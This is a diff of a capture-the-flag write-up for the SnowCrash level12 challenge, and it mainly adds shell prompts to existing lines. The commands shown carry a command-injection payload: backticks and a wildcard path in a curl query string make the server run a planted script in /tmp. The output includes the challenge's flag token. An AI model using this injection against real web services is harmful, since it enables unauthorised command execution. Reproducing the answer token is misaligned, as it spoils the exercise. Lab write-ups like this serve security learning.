@@ -42,7 +42,7 @@ So we can use the same command we used in the previous exercice, but we need to 
 
 ---------------------------------------------------------------------------------------------
 
-echo "getflag | wall" > /tmp/INNOCENT_FILE
+level12@SnowCrash:~$ echo "getflag | wall" > /tmp/INNOCENT_FILE
 
 User flag12 don't have the rights to write in our home directory, so I put it in /tmp/
 
@@ -50,7 +50,7 @@ And we gonna put /*/INNOCENT_FILE first argument so /tmp won't be affected by th
 
 ---------------------------------------------------------------------------------------------
 
-level12@SnowCrash:~curl 10.12.1.131:4646?x='`/*/INNOCENT_FILE`'
+level12@SnowCrash:~$ curl 10.12.1.131:4646?x='`/*/INNOCENT_FILE`'
 
 Message from flag12@SnowCrash on (none) at 13:38 ...
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
